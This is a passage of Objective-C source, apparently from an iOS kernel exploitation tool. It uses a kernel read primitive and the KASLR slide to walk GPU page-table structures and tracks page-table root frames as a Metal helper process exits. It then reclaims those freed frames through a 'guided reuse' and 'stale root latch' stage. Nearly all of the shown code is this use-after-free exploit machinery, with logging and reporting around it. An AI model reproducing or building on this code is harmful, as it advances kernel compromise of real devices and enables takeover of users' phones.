        cleanupUnmapped =
            munmap(sharedMapping, CNDUatE1PageSize) == 0;
        sharedMapping = MAP_FAILED;
        sharedWords = NULL;
    } else {
        cleanupUnmapped = true;
    }
    if (sharedFD >= 0) {
        cleanupClosed = close(sharedFD) == 0;
        sharedFD = -1;
    } else {
        cleanupClosed = true;
    }
    if (sharedFileCreated && sharedFileURL != nil) {
        cleanupUnlinked =
            unlink(sharedFileURL.fileSystemRepresentation) == 0;
    } else {
        cleanupUnlinked = true;
    }
    report[@"e4SharedFileCleanup"] = @{
        @"ownFileOnly": @YES,
        @"unmapped": @(cleanupUnmapped),
        @"closed": @(cleanupClosed),
        @"unlinked": @(cleanupUnlinked),
        @"passed": @(cleanupUnmapped && cleanupClosed && cleanupUnlinked),
    };
    if (!cleanupUnmapped || !cleanupClosed || !cleanupUnlinked) {
        result = CNDUatE1TTBATRunAborted;
        if (reasonOut != NULL) {
            *reasonOut = @"e4-shared-file-cleanup-failed";
        }
    }
    report[@"e4KernelWrites"] = @0;
    report[@"e4PointerScanUsed"] = @NO;
    report[@"e4GetPTEInvoked"] = @NO;
    report[@"e4QueueProbeInvoked"] = @NO;
    CNDUatE1Persist(report);
    return result;
}

static CNDUatE1TTBATRunResult CNDUatE2RunTTBATRetirementRoute(
    NSMutableDictionary<NSString *, id> *report, const CNDUatE1API *api,
    uint64_t slide, uint64_t selfTask, NSString **reasonOut)
{
    CNDUatE1TTBATRunResult result = CNDUatE1TTBATRunAborted;
    CNDUatE1TTBATSnapshot before = {0};
    CNDUatE1TTBATSnapshot whileOpen = {0};
    CNDUatE1TTBATSnapshot afterExit = {0};
    CNDUatE2CheckedWalker walker = {0};
    CNDUatE2ReuseReservation reservation = {0};
    CNDUatE2ReuseTranslation *reuseTranslations = NULL;
    CNDUatE2ReuseTranslation firstGuardTranslation = {0};
    CNDUatE2ReuseTranslation lastGuardTranslation = {0};
    CNDUatE2FreeMaskOracle freeMaskOracles[2] = {0};
    CNDUatE2FreeMaskOracle livePathOracles[2] = {0};
    CNDUatE3LivePath livePath = {0};
    CNDUatE3CapturedPlan capturedPlan = {0};
    NSDictionary *beforeSummary = nil;
    NSDictionary *whileSummary = nil;
    NSDictionary *afterSummary = nil;
    NSMutableArray *liveMaskRoots = nil;
    NSMutableArray *afterMaskRoots = nil;
    NSMutableDictionary *freeMaskReport = nil;
    NSMutableDictionary *livePathReport = nil;
    NSMutableArray *livePathAfterOracles = nil;
    NSMutableArray *captureMatches = nil;
    NSString *tokenHex = @"";
    NSString *reuseReason = nil;
    NSString *latchReason = nil;
    const char *freeMaskReason = NULL;
    NSArray *openChanges = nil;
    NSArray *closeChanges = nil;
    NSDictionary *openTransition = nil;
    CNDUatE2ExternalRendezvous rendezvous = {
        .listenFD = -1, .peerFD = -1, .port = 0,
    };
    CNDUatE2ExternalMessage readyMessage = {0};
    CNDUatE2ExternalMessage exitingMessage = {0};
    bool rendezvousOpened = false;
    bool helperAccepted = false;
    bool helperReady = false;
    bool helperReleased = false;
    bool helperExitMessage = false;
    bool helperPeerEOF = false;
    bool helperProcessGone = false;
    bool exitingPIDMatches = false;
    bool walkerPrepared = false;
    bool translationWorkspaceFaulted = false;
    bool rawAfterSnapshotRead = false;
    bool rawAfterSnapshotShapePassed = false;
    bool retired = false;
    bool reuseAttempted = false;
    bool reuseSampleValid = false;
    bool reuseMatched = false;
    bool freeMaskPrepared = false;
    bool freeMaskReadsValid = false;
    bool freeMaskAllSet = false;
    bool livePathValidated = false;
    bool livePathOraclesPrepared = false;
    bool livePathOracleReadsValid = false;
    bool latchAttempted = false;
    bool latchPassed = false;
    bool latchStaleObserved = false;
    int rendezvousError = 0;
    NSUInteger afterAttempts = 0;
    NSUInteger observedIndex = NSNotFound;
    NSUInteger rawCloseChangedCount = 0;
    NSUInteger processGoneAttempts = 0;
    NSUInteger freeMaskPollAttempts = 0;
    NSUInteger freeMaskSetCount = 0;
    NSUInteger livePathOraclePollAttempts = 0;
    NSUInteger livePathOracleSetCount = 0;
    NSUInteger firstGuardReadCalls = 0;
    NSUInteger lastGuardReadCalls = 0;
    uint64_t retiredRoot0 = 0;
    uint64_t retiredRoot1 = 0;
    uint64_t freeMaskBase = 0;
    uint32_t freeMaskFirstPnum = 0;
    int processGoneErrno = 0;
    const char *firstGuardReason = NULL;
    const char *lastGuardReason = NULL;
    const char *livePathReason = NULL;
    const char *livePathOracleReason = NULL;

    uint64_t readyAddress = CNDUatE1IOUATMapsReady + slide;
    CNDUatE1Progress(report, @"e2.ttbat", @"read-maps-ready", readyAddress);
    uint8_t ready = 0;
    if (!CNDUatE1Read8(api, readyAddress, &ready) || ready != 2) {
        report[@"ttbatMapsReady"] = @(ready);
        if (reasonOut != NULL) *reasonOut = @"e2-ttbat-maps-not-ready";
        goto done;
    }

    uint64_t mapSlotAddress = CNDUatE1TTBATMapVA + slide;
    CNDUatE1Progress(report, @"e2.ttbat", @"read-retained-map-va",
                     mapSlotAddress);
    uint64_t ttbatRaw = 0;
    if (!CNDUatE1Read64(api, mapSlotAddress, &ttbatRaw)) {
        if (reasonOut != NULL) *reasonOut = @"e2-ttbat-map-read-failed";
        goto done;
    }
    uint64_t ttbat = CNDUatE1CanonicalPointer(api, ttbatRaw);
    bool ttbatPassed = ttbatRaw == ttbat && ttbat != 0 &&
        (ttbat & (CNDUatE1PageSize - 1)) == 0 &&
        sizeof(before) <= CNDUatE1PageSize;
    report[@"ttbatMapPredicate"] = @{
        @"slotAddress": CNDUatE1Hex(mapSlotAddress),
        @"raw": CNDUatE1Hex(ttbatRaw),
        @"canonical": CNDUatE1Hex(ttbat),
        @"aligned16K": @((ttbat & (CNDUatE1PageSize - 1)) == 0),
        @"mappingTarget": @"permanent-kernel-task",
        @"staticLifetimeWitness":
            @"C26-E1-TTBAT-EL1-MAP-LIFETIME-TRACE-20261105",
        @"passed": @(ttbatPassed),
    };
    CNDUatE1Persist(report);
    if (!ttbatPassed) {
        if (reasonOut != NULL) *reasonOut = @"e2-ttbat-map-predicate-failed";
        goto done;
    }
    if (!CNDUatE1SnapshotTTBAT(
            report, api, @"e2.before", ttbat, &before, &beforeSummary)) {
        if (reasonOut != NULL) *reasonOut = @"e2-before-snapshot-failed";
        goto done;
    }
    report[@"tableReached"] = @YES;
    report[@"beforeTTBATSnapshot"] = beforeSummary;
    CNDUatE1Persist(report);

    if (!CNDUatE2ReserveReuseBatch(report, &reservation, reasonOut)) {
        goto done;
    }
    uint64_t firstCandidate = reservation.candidateBase;
    uint64_t lastCandidate = reservation.candidateBase +
        (CNDUatE2ReuseCandidatePages - 1) * CNDUatE1PageSize;
    if (!CNDUatE2PrepareCheckedWalker(
            report, api, slide, selfTask, firstCandidate, lastCandidate,
            &walker, reasonOut)) {
        goto done;
    }
    walkerPrepared = true;

    uint64_t firstGuard = reservation.allocation;
    uint64_t lastGuard = reservation.allocation +
        (CNDUatE2ReuseTotalPages - 1) * CNDUatE1PageSize;
    bool firstGuardTranslated = CNDUatE2TranslateContiguousPages(
        api, &walker, firstGuard, 1, &firstGuardTranslation,
        &firstGuardReadCalls, &firstGuardReason);
    bool lastGuardTranslated = firstGuardTranslated &&
        CNDUatE2TranslateContiguousPages(
            api, &walker, lastGuard, 1, &lastGuardTranslation,
            &lastGuardReadCalls, &lastGuardReason);
    bool guardsValidated = firstGuardTranslated && lastGuardTranslated &&
        firstGuardTranslation.virtualAddress == firstGuard &&
        lastGuardTranslation.virtualAddress == lastGuard &&
        firstGuardTranslation.physicalFrame != 0 &&
        lastGuardTranslation.physicalFrame != 0 &&
        firstGuardTranslation.physicalFrame !=
            lastGuardTranslation.physicalFrame &&
        CNDUatE2WalkerAnchorsStable(api, &walker);
    report[@"allocatorReuseGuardValidation"] = @{
        @"firstGuardVA": CNDUatE1Hex(firstGuard),
        @"firstGuardFrame":
            CNDUatE1Hex(firstGuardTranslation.physicalFrame),
        @"firstGuardTranslated": @(firstGuardTranslated),
        @"firstGuardReason": firstGuardReason != NULL
            ? [NSString stringWithUTF8String:firstGuardReason] : @"none",
        @"lastGuardVA": CNDUatE1Hex(lastGuard),
        @"lastGuardFrame": CNDUatE1Hex(lastGuardTranslation.physicalFrame),
        @"lastGuardTranslated": @(lastGuardTranslated),
        @"lastGuardReason": lastGuardReason != NULL
            ? [NSString stringWithUTF8String:lastGuardReason] : @"none",
        @"checkedReadAPICalls":
            @(firstGuardReadCalls + lastGuardReadCalls + 7),
        @"distinctFrames": @(
            firstGuardTranslation.physicalFrame != 0 &&
            lastGuardTranslation.physicalFrame != 0 &&
            firstGuardTranslation.physicalFrame !=
                lastGuardTranslation.physicalFrame),
        @"validatedBeforeRetirement": @(guardsValidated),
    };
    CNDUatE1Persist(report);
    if (!guardsValidated) {
        if (reasonOut != NULL) {
            *reasonOut = @"reuse-guard-translation-validation-failed";
        }
        goto done;
    }

    size_t translationWorkspaceBytes =
        CNDUatE2TranslationMaximumPages *
        sizeof(CNDUatE2ReuseTranslation);
    reuseTranslations = calloc(
        CNDUatE2TranslationMaximumPages,
        sizeof(CNDUatE2ReuseTranslation));
    if (reuseTranslations == NULL) {
        if (reasonOut != NULL) {
            *reasonOut = @"reuse-translation-workspace-allocation-failed";
        }
        goto done;
    }
    volatile uint8_t *translationWorkspaceBytesPointer =
        (volatile uint8_t *)reuseTranslations;
    translationWorkspaceFaulted = true;
    for (size_t offset = 0; offset < translationWorkspaceBytes;
         offset += CNDUatE1PageSize) {
        translationWorkspaceBytesPointer[offset] = UINT8_C(0xa5);
        if (translationWorkspaceBytesPointer[offset] != UINT8_C(0xa5)) {
            translationWorkspaceFaulted = false;
            break;
        }
        translationWorkspaceBytesPointer[offset] = 0;
    }
    if (translationWorkspaceFaulted && translationWorkspaceBytes != 0) {
        size_t lastOffset = translationWorkspaceBytes - 1;
        translationWorkspaceBytesPointer[lastOffset] = UINT8_C(0x5a);
        translationWorkspaceFaulted =
            translationWorkspaceBytesPointer[lastOffset] == UINT8_C(0x5a);
        translationWorkspaceBytesPointer[lastOffset] = 0;
    }
    report[@"allocatorReuseTranslationWorkspace"] = @{
        @"capacityPages": @(CNDUatE2TranslationMaximumPages),
        @"bytes": @(translationWorkspaceBytes),
        @"faultedBeforeRetirement": @(translationWorkspaceFaulted),
        @"ownAllocationOnly": @YES,
    };
    CNDUatE1Persist(report);
    if (!translationWorkspaceFaulted) {
        if (reasonOut != NULL) {
            *reasonOut = @"reuse-translation-workspace-prefault-failed";
        }
        goto done;
    }

    CNDUatE1Progress(
        report, @"e2.action", @"open-external-helper-rendezvous", 0);
    rendezvousOpened = CNDUatE2OpenExternalRendezvous(
        &rendezvous, &rendezvousError);
    tokenHex = CNDUatE2TokenHex(rendezvous.token);
    report[@"externalHelperRendezvous"] = @{
        @"opened": @(rendezvousOpened),
        @"error": @(rendezvousError),
        @"errorDescription": rendezvousError != 0
            ? [NSString stringWithUTF8String:strerror(rendezvousError)]
            : @"none",
        @"observerPID": @(getpid()),
        @"port": @(rendezvous.port),
        @"token": tokenHex,
        @"address": @"127.0.0.1",
        @"loopbackOnly": @YES,
        @"helperBundleID": @"com.zeroxjf.cyanide.e2metal",
        @"protocolVersion": @(CNDUatE2ExternalMessageVersion),
        @"helperTouchesKRWLifecycle": @NO,
        @"helperLinksKRWCode": @NO,
        @"hostLaunchRequired": @YES,
    };
    CNDUatE1Persist(report);
    if (!rendezvousOpened) {
        if (reasonOut != NULL) {
            *reasonOut = @"e2-external-helper-rendezvous-failed";
        }
        goto done;
    }
    log_user("[UAT_E2] external-helper-ready observerPid=%d port=%u "
             "token=%s bundle=com.zeroxjf.cyanide.e2metal mode=retire\n",
             getpid(), rendezvous.port, tokenHex.UTF8String);

    CNDUatE1Progress(
        report, @"e2.action", @"wait-external-helper-ready", 0);
    helperAccepted = CNDUatE2AcceptExternalHelper(
        &rendezvous, &rendezvousError);
    helperReady = helperAccepted && CNDUatE2ReadExternalMessage(
        rendezvous.peerFD, rendezvous.token,
        CNDUatE2ExternalMessageReady, &readyMessage);
    report[@"externalHelperReady"] = @{
        @"accepted": @(helperAccepted),
        @"acceptError": @(rendezvousError),
        @"messagePassed": @(helperReady),
        @"pid": @(readyMessage.pid),
        @"result": @(readyMessage.result),
        @"metalStatus": @(readyMessage.metalStatus),
        @"fillVerified": @(readyMessage.fillVerified != 0),
        @"mode": @(readyMessage.mode),
        @"gpuAddress": CNDUatE1Hex(readyMessage.gpuAddress),
        @"patternBytes": @(readyMessage.primaryPatternBytes),
        @"secondaryGPUAddress":
            CNDUatE1Hex(readyMessage.secondaryGPUAddress),
        @"tokenMatched": @(helperReady),
    };
    CNDUatE1Persist(report);
    if (!helperAccepted) {
        if (reasonOut != NULL) {
            *reasonOut = @"e2-external-helper-accept-failed";
        }
        goto done;
    }
    if (!helperReady || readyMessage.result != 0 ||
        readyMessage.fillVerified == 0 ||
        readyMessage.mode != CNDUatE2ExternalModeRetire ||
        readyMessage.gpuAddress == 0 ||
        (readyMessage.gpuAddress & (CNDUatE1PageSize - 1)) != 0 ||
        readyMessage.primaryPatternBytes != CNDUatE1PageSize ||
        readyMessage.secondaryGPUAddress != 0 ||
        readyMessage.secondaryPatternBytes != 0) {
        if (reasonOut != NULL) {
            *reasonOut = @"e2-external-helper-not-ready";
        }
        goto release_helper;
    }
    report[@"namedActionStatus"] = @"external-helper-live";
    CNDUatE1Persist(report);

    if (!CNDUatE1SnapshotTTBAT(
            report, api, @"e2.while-external-helper-alive", ttbat,
            &whileOpen, &whileSummary)) {
        if (reasonOut != NULL) *reasonOut = @"e2-while-snapshot-failed";
        goto release_helper;
    }
    report[@"whileExternalHelperAliveTTBATSnapshot"] = whileSummary;
    openChanges = CNDUatE1TTBATDiff(
        &before, &whileOpen, ttbat, @"external-helper-open");
    openTransition = CNDUatE2ExactOpenTransition(openChanges);
    report[@"openChanges"] = openChanges ?: @[];
    report[@"openTransitionExact"] = @(openTransition != nil);
    if (openTransition != nil) {
        observedIndex = [openTransition[@"index"] unsignedIntegerValue];
        if (observedIndex < CNDUatE1TTBATEntries) {
            uint64_t rootWord0 = whileOpen.words[observedIndex * 2];
            uint64_t rootWord1 = whileOpen.words[observedIndex * 2 + 1];
            retiredRoot0 = rootWord0 & CNDUatE1TTBATPaddrMask;
            retiredRoot1 = rootWord1 & CNDUatE1TTBATPaddrMask;
            bool rootsPassed = (rootWord0 & 1) != 0 &&
                (rootWord1 & 1) != 0 && retiredRoot0 != 0 &&
                retiredRoot1 != 0 &&
                (retiredRoot0 & (CNDUatE1PageSize - 1)) == 0 &&
                (retiredRoot1 & (CNDUatE1PageSize - 1)) == 0;
            if (!rootsPassed) {
                observedIndex = NSNotFound;
                retiredRoot0 = 0;
                retiredRoot1 = 0;
            }
        }
        report[@"observedContextID"] = openTransition[@"index"];
        report[@"observedRoot0"] =
            openTransition[@"afterWord0"][@"paddr"] ?: @"0x0";
        report[@"observedRoot1"] =
            openTransition[@"afterWord1"][@"paddr"] ?: @"0x0";
    }
    CNDUatE1Persist(report);
    log_user("[UAT_E2] helper-open pid=%u changes=%lu exact=%s context=%s "
             "root0=%s root1=%s\n", readyMessage.pid,
             (unsigned long)openChanges.count,
             openTransition != nil ? "yes" : "no",
             [[openTransition[@"index"] description] UTF8String] ?: "-",
             [report[@"observedRoot0"] UTF8String] ?: "-",
             [report[@"observedRoot1"] UTF8String] ?: "-");
    if (openTransition == nil || observedIndex == NSNotFound) {
        if (reasonOut != NULL) {
            *reasonOut = openTransition == nil
                ? @"no-exact-external-helper-open-transition"
                : @"external-helper-root-shape-failed";
        }
        goto release_helper;
    }

    CNDUatE1Progress(
        report, @"e2.free-mask", @"validate-live-root-bits-clear", 0);
    freeMaskPrepared = CNDUatE2PrepareFreeMaskOracles(
        api, slide, retiredRoot0, retiredRoot1, freeMaskOracles,
        &freeMaskBase, &freeMaskFirstPnum, &freeMaskReason);
    uint64_t freeMasksSlot = 0;
    uint64_t firstPnumAddress = 0;
    (void)CNDUatE2AddSlide(
        CNDUatE2KernelVMPageFreeMasks, slide, &freeMasksSlot);
    (void)CNDUatE2AddSlide(
        CNDUatE2KernelPmapFirstPnum, slide, &firstPnumAddress);
    liveMaskRoots = [NSMutableArray arrayWithCapacity:2];
    for (NSUInteger index = 0; index < 2; index++) {
        CNDUatE2FreeMaskOracle oracle = freeMaskOracles[index];
        [liveMaskRoots addObject:@{
            @"rootIndex": @(index),
            @"rootPhysical": CNDUatE1Hex(oracle.rootPhysical),
            @"pageNumber": CNDUatE1Hex(oracle.pageNumber),
            @"clusterIndex": CNDUatE1Hex(oracle.clusterIndex),
            @"wordAddress": CNDUatE1Hex(oracle.wordAddress),
            @"bitMask": CNDUatE1Hex(oracle.bitMask),
            @"liveWord": CNDUatE1Hex(oracle.liveWord),
            @"liveWordStable": @(oracle.liveWordStable),
            @"liveBitClear": @(oracle.liveBitClear),
        }];
    }
    report[@"rootFreeMaskOracle"] = @{
        @"staticAudit": @"e2_free_mask_oracle_audit.py",
        @"staticAuditStatus": @"e2-root-free-mask-oracle-static-gated",
        @"masksPointerSlot": CNDUatE1Hex(freeMasksSlot),
        @"masksBase": CNDUatE1Hex(freeMaskBase),
        @"pmapFirstPnumAddress": CNDUatE1Hex(firstPnumAddress),
        @"pmapFirstPnum": CNDUatE1Hex(freeMaskFirstPnum),
        @"clusterPages": @128,
        @"pageShift": @14,
        @"prepared": @(freeMaskPrepared),
        @"failureReason": freeMaskReason != NULL
            ? [NSString stringWithUTF8String:freeMaskReason] : @"none",
        @"liveRoots": liveMaskRoots,
        @"kernelWrites": @0,
        @"rootFrameDereferenced": @NO,
        @"vmPageScanUsed": @NO,
        @"addressDerivation":
            @"exact-image globals plus validated TTBAT root paddr only",
    };
    CNDUatE1Persist(report);
    log_user("[UAT_E2] free-mask-live prepared=%s base=0x%016llx "
             "firstPnum=0x%08x root0Word=0x%016llx clear=%s "
             "root1Word=0x%016llx clear=%s reason=%s\n",
             freeMaskPrepared ? "yes" : "no",
             (unsigned long long)freeMaskBase, freeMaskFirstPnum,
             (unsigned long long)freeMaskOracles[0].wordAddress,
             freeMaskOracles[0].liveBitClear ? "yes" : "no",
             (unsigned long long)freeMaskOracles[1].wordAddress,
             freeMaskOracles[1].liveBitClear ? "yes" : "no",
             freeMaskReason != NULL ? freeMaskReason : "none");
    if (!freeMaskPrepared) {
        if (reasonOut != NULL) {
            *reasonOut = freeMaskReason != NULL
                ? [NSString stringWithUTF8String:freeMaskReason]
                : @"free-mask-live-predicate-failed";
        }
        goto release_helper;
    }

    CNDUatE1Progress(
        report, @"e3.live-path", @"resolve-named-metal-buffer-path", 0);
    livePathValidated = CNDUatE3ResolveLivePath(
        api, &walker, readyMessage.gpuAddress, retiredRoot0, retiredRoot1,
        &livePath, &livePathReason);
    if (livePathValidated) {
        livePathOraclesPrepared = CNDUatE3PrepareLivePathFreeMaskOracles(
            api, freeMaskBase, freeMaskFirstPnum, &livePath,
            livePathOracles, &livePathOracleReason);
    }
    report[@"e3LiveMetalPath"] = @{
        @"validated": @(livePathValidated),
        @"failureReason": livePathReason != NULL
            ? [NSString stringWithUTF8String:livePathReason] : @"none",
        @"gpuAddress": CNDUatE1Hex(readyMessage.gpuAddress),
        @"ttbrIndex": @(livePath.rootIndex),
        @"catalogueIndex": @(livePath.catalogueIndex),
        @"directoryIndex": @(livePath.directoryIndex),
        @"leafIndex": @(livePath.leafIndex),
        @"rootPhysical": CNDUatE1Hex(livePath.rootPhysical),
        @"rootVirtual": CNDUatE1Hex(livePath.rootVirtual),
        @"rootEntryAddress": CNDUatE1Hex(livePath.rootEntryAddress),
        @"rootEntry": CNDUatE1Hex(livePath.rootEntry),
        @"directoryPhysical": CNDUatE1Hex(livePath.directoryPhysical),
        @"directoryVirtual": CNDUatE1Hex(livePath.directoryVirtual),
        @"directoryEntryAddress":
            CNDUatE1Hex(livePath.directoryEntryAddress),
        @"directoryEntry": CNDUatE1Hex(livePath.directoryEntry),
        @"tablePhysical": CNDUatE1Hex(livePath.tablePhysical),
        @"tableVirtual": CNDUatE1Hex(livePath.tableVirtual),
        @"leafEntryAddress": CNDUatE1Hex(livePath.leafEntryAddress),
        @"leafEntry": CNDUatE1Hex(livePath.leafEntry),
        @"leafPhysical": CNDUatE1Hex(livePath.leafPhysical),
        @"leafVirtual": CNDUatE1Hex(livePath.leafVirtual),
        @"leafInPhysmap": @(livePath.leafInPhysmap),
        @"freeMaskOraclesPrepared": @(livePathOraclesPrepared),
        @"freeMaskOracleFailureReason": livePathOracleReason != NULL
            ? [NSString stringWithUTF8String:livePathOracleReason] : @"none",
        @"walkShape": @"named-gpu-va-bit42-bits36-41-bits25-35-bits14-24",
        @"childTableAddressMask": @"0x000003ffffffc000",
        @"leafOutputAddressMask": @"0x000000ffffffc000",
        @"kernelWrites": @0,
        @"pointerScanUsed": @NO,
    };
    CNDUatE1Persist(report);
    log_user("[UAT_E3] live-path valid=%s gpuVA=0x%016llx ttbr=%lu "
             "root=0x%016llx directory=0x%016llx table=0x%016llx "
             "leaf=0x%016llx oracles=%s reason=%s oracleReason=%s\n",
             livePathValidated ? "yes" : "no",
             (unsigned long long)readyMessage.gpuAddress,
             (unsigned long)livePath.rootIndex,
             (unsigned long long)livePath.rootPhysical,
             (unsigned long long)livePath.directoryPhysical,
             (unsigned long long)livePath.tablePhysical,
             (unsigned long long)livePath.leafPhysical,
             livePathOraclesPrepared ? "yes" : "no",
             livePathReason != NULL ? livePathReason : "none",
             livePathOracleReason != NULL ? livePathOracleReason : "none");

release_helper:
    CNDUatE1Progress(
        report, @"e2.action", @"release-external-helper-to-exit", 0);
    if (rendezvous.peerFD >= 0) {
        uint8_t release = CNDUatE2ChildReleaseByte;
        helperReleased = CNDUatE2WriteAll(
            rendezvous.peerFD, &release, sizeof(release));
    }
    helperExitMessage = helperReleased && CNDUatE2ReadExternalMessage(
        rendezvous.peerFD, rendezvous.token,
        CNDUatE2ExternalMessageExiting, &exitingMessage);
    exitingPIDMatches = helperExitMessage &&
        exitingMessage.pid == readyMessage.pid;
    helperPeerEOF = helperExitMessage && exitingPIDMatches &&
        CNDUatE2WaitForExternalPeerEOF(rendezvous.peerFD);
    if (rendezvous.peerFD >= 0) {
        close(rendezvous.peerFD);
        rendezvous.peerFD = -1;
    }
    if (!helperReleased || !helperExitMessage || !exitingPIDMatches ||
        exitingMessage.result != 0 || !helperPeerEOF) {
        if (reasonOut != NULL) {
            *reasonOut = @"e2-external-helper-exit-failed";
        }
        goto done;
    }

    // From peer EOF through the free-mask observations and candidate faults,
    // keep the teardown witness in plain C storage.  Peer EOF is not task
    // phase-2 completion: require kill(pid, 0) == ESRCH before accepting the
    // root-free oracle or touching candidate pages.
    helperProcessGone = CNDUatE2WaitForProcessGone(
        (pid_t)readyMessage.pid, &processGoneAttempts,
        &processGoneErrno);
    if (helperProcessGone && freeMaskPrepared) {
        freeMaskReadsValid = CNDUatE2ObserveFreeMaskTransitions(
            api, freeMaskOracles, &freeMaskPollAttempts,
            &freeMaskAllSet);
        freeMaskSetCount =
            (freeMaskOracles[0].afterBitSet ? 1 : 0) +
            (freeMaskOracles[1].afterBitSet ? 1 : 0);
        if (livePathOraclesPrepared) {
            livePathOracleReadsValid =
                CNDUatE3ObserveLivePathFreeMaskTransitions(
                    api, livePathOracles, &livePathOraclePollAttempts,
                    &livePathOracleSetCount);
        }

        for (NSUInteger attempt = 0; attempt < CNDUatE2RetirePollCount;
             attempt++) {
            afterAttempts = attempt + 1;
            if (attempt != 0) usleep(20000);
            memset(&afterExit, 0, sizeof(afterExit));
            rawAfterSnapshotRead = CNDUatE1Read(
                api, ttbat, &afterExit, sizeof(afterExit));
            if (!rawAfterSnapshotRead) break;
            rawAfterSnapshotShapePassed =
                CNDUatE1TTBATShapePassedRaw(&afterExit);
            if (!rawAfterSnapshotShapePassed) break;
            retired = CNDUatE2ExactCloseTransitionRaw(
                &whileOpen, &afterExit, observedIndex,
                &rawCloseChangedCount);
            if (retired) break;
        }

        if (retired) {
            reuseAttempted = true;
            reuseSampleValid = CNDUatE2RunGuidedReuseSample(
                report, api, &walker, &reservation, reuseTranslations,
                CNDUatE2TranslationMaximumPages, retiredRoot0,
                retiredRoot1, freeMaskOracles,
                livePathValidated ? &livePath : NULL,
                livePathOraclesPrepared ? livePathOracles : NULL,
                &capturedPlan,
                &reuseMatched, &reuseReason);
            if (capturedPlan.complete) {
                latchAttempted = true;
                latchPassed = CNDUatE3RunStaleRootLatch(
                    report, api, &walker, ttbat, &afterExit,
                    observedIndex, livePath.rootIndex, &capturedPlan,
                    &freeMaskOracles[livePath.rootIndex],
                    livePathOracles, &latchStaleObserved, &latchReason);
            }
        }
    }

    livePathReport = [report[@"e3LiveMetalPath"] mutableCopy] ?:
        [NSMutableDictionary dictionary];
    livePathAfterOracles = [NSMutableArray arrayWithCapacity:2];
    const char *livePathNames[2] = {"directory", "table"};
    for (NSUInteger index = 0; index < 2; index++) {
        CNDUatE2FreeMaskOracle oracle = livePathOracles[index];
        [livePathAfterOracles addObject:@{
            @"name": [NSString stringWithUTF8String:livePathNames[index]],
            @"physical": CNDUatE1Hex(oracle.rootPhysical),
            @"wordAddress": CNDUatE1Hex(oracle.wordAddress),
            @"bitMask": CNDUatE1Hex(oracle.bitMask),
            @"liveWord": CNDUatE1Hex(oracle.liveWord),
            @"liveWordStable": @(oracle.liveWordStable),
            @"liveBitClear": @(oracle.liveBitClear),
            @"afterWord": CNDUatE1Hex(oracle.afterWord),
            @"afterWordStable": @(oracle.afterWordStable),
            @"afterBitSet": @(oracle.afterBitSet),
            @"firstSetPollAttempt": @(oracle.afterPollAttempt),
        }];
    }
    livePathReport[@"freeMaskAfterReadsValid"] =
        @(livePathOracleReadsValid);
    livePathReport[@"freeMaskPollAttempts"] =
        @(livePathOraclePollAttempts);
    livePathReport[@"freeMaskSetCount"] = @(livePathOracleSetCount);
    livePathReport[@"freeMaskAfterOracles"] = livePathAfterOracles;

    captureMatches = [NSMutableArray arrayWithCapacity:3];
    if (livePathValidated) {
        const char *targetNames[3] = {
            "root", "directory", "table",
        };
        const uint64_t targetFrames[3] = {
            livePath.rootPhysical, livePath.directoryPhysical,
            livePath.tablePhysical,
        };
        NSArray *capturedPages =
            report[@"allocatorReuseSample"][@"pages"];
        for (NSUInteger target = 0; target < 3; target++) {
            NSString *targetHex = CNDUatE1Hex(targetFrames[target]);
            NSDictionary *matchedPage = nil;
            for (NSDictionary *page in capturedPages) {
                if ([page[@"physicalFrame"] isEqual:targetHex]) {
                    matchedPage = page;
                    break;
                }
            }
            [captureMatches addObject:@{
                @"name": [NSString stringWithUTF8String:targetNames[target]],
                @"physical": targetHex,
                @"captured": @(matchedPage != nil),
                @"captureIndex": matchedPage != nil
                    ? matchedPage[@"index"] : (id)[NSNull null],
                @"captureVirtualAddress": matchedPage != nil
                    ? matchedPage[@"virtualAddress"] : (id)[NSNull null],
            }];
        }
    }
    livePathReport[@"guidedCaptureMatches"] = captureMatches;
    livePathReport[@"guidedCaptureMatchCount"] = @(
        [captureMatches filteredArrayUsingPredicate:
            [NSPredicate predicateWithBlock:
                ^BOOL(NSDictionary *entry, NSDictionary *bindings) {
                    (void)bindings;
                    return [entry[@"captured"] boolValue];
                }]].count);
    report[@"e3LiveMetalPath"] = livePathReport;
    log_user("[UAT_E3] path-retirement oracles=%s set=%lu/2 "
             "capture-matches=%s\n",
             livePathOracleReadsValid ? "valid" : "invalid",
             (unsigned long)livePathOracleSetCount,
             [[livePathReport[@"guidedCaptureMatchCount"] description]
                 UTF8String] ?: "0");

    report[@"externalHelperExit"] = @{
        @"releaseSent": @(helperReleased),
        @"exitMessagePassed": @(helperExitMessage),
        @"readyPID": @(readyMessage.pid),
        @"exitingPID": @(exitingMessage.pid),
        @"pidMatchesReady": @(exitingPIDMatches),
        @"result": @(exitingMessage.result),
        @"peerEOF": @(helperPeerEOF),
        @"processGone": @(helperProcessGone),
        @"processGonePollAttempts": @(processGoneAttempts),
        @"processGoneErrno": @(processGoneErrno),
        @"processGoneErrnoDescription": processGoneErrno != 0
            ? [NSString stringWithUTF8String:strerror(processGoneErrno)]
            : @"none",
        @"hostConsoleExitStatusRequired": @YES,
        @"deviceExitWitness":
            @"authenticated-exiting-message-plus-loopback-peer-eof-plus-"
             "kill-pid-zero-ESRCH",
    };
    afterMaskRoots = [NSMutableArray arrayWithCapacity:2];
    for (NSUInteger index = 0; index < 2; index++) {
        CNDUatE2FreeMaskOracle oracle = freeMaskOracles[index];
        [afterMaskRoots addObject:@{
            @"rootIndex": @(index),
            @"rootPhysical": CNDUatE1Hex(oracle.rootPhysical),
            @"wordAddress": CNDUatE1Hex(oracle.wordAddress),
            @"bitMask": CNDUatE1Hex(oracle.bitMask),
            @"afterWord": CNDUatE1Hex(oracle.afterWord),
            @"afterWordStable": @(oracle.afterWordStable),
            @"afterBitSet": @(oracle.afterBitSet),
            @"firstSetPollAttempt": @(oracle.afterPollAttempt),
            @"clearToSetObserved": @(
                oracle.liveBitClear && oracle.afterBitSet),
        }];
    }
    freeMaskReport = [report[@"rootFreeMaskOracle"] mutableCopy] ?:
        [NSMutableDictionary dictionary];
    freeMaskReport[@"processGoneGatePassed"] = @(helperProcessGone);
    freeMaskReport[@"afterReadsValid"] = @(freeMaskReadsValid);
    freeMaskReport[@"pollAttempts"] = @(freeMaskPollAttempts);
    freeMaskReport[@"setRootCount"] = @(freeMaskSetCount);
    freeMaskReport[@"allRootBitsSet"] = @(freeMaskAllSet);
    freeMaskReport[@"afterRoots"] = afterMaskRoots;
    freeMaskReport[@"positiveScope"] = freeMaskSetCount == 2
        ? @"both validated TTBAT root frames entered the global regular-page free mask"
        : (freeMaskSetCount == 1
            ? @"one validated TTBAT root frame entered the global regular-page free mask"
